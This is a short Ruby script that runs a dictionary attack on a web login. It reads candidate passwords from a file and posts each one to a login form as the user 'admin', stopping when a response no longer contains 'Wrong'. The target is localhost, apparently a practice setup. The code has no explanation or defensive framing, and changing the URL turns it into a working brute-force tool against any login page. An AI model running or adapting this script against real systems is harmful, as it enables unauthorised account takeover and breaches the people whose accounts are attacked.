require 'net/http'
require 'uri'

def is_wrong_password? password
uri = URI.parse 'http://localhost:4567/login'
response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
response.include? 'Wrong'
end

input = File.open 'passwords.txt', 'r'
while (line = input.gets)
  line.strip!
  print "Trying pass #{line}: "

    if is_wrong_password? line
      puts "Error"
    else
      puts "Found!"
      input.close
      exit
    end
end

